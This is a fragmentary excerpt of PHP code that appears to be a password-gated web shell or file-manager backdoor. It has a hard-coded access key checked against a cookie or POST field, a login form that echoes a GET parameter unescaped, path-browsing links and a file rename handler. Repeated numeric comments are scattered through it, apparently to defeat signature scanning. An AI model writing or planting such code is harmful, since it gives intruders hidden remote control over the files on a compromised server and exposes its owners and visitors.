...
$auth_key = "c174f403154ad263a301c05f4a310c81";
...
$pass = false;
if (isset($_COOKIE['pw_name_66546'])) {
    if(($_COOKIE['pw_name_66546']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_66546'])) {
        if(($_POST['pw_name_66546']) == $auth_key) {
            setcookie("pw_name_66546", $_POST['pw_name_66546']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_66546' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725450214566773 1725450214468028 1725450214742548 1725450214106554
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725450214566773 1725450214468028 1725450214742548 1725450214106554
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725450214566773 1725450214468028 1725450214742548 1725450214106554
            $name = PATH . "/" . $_GET['r'];
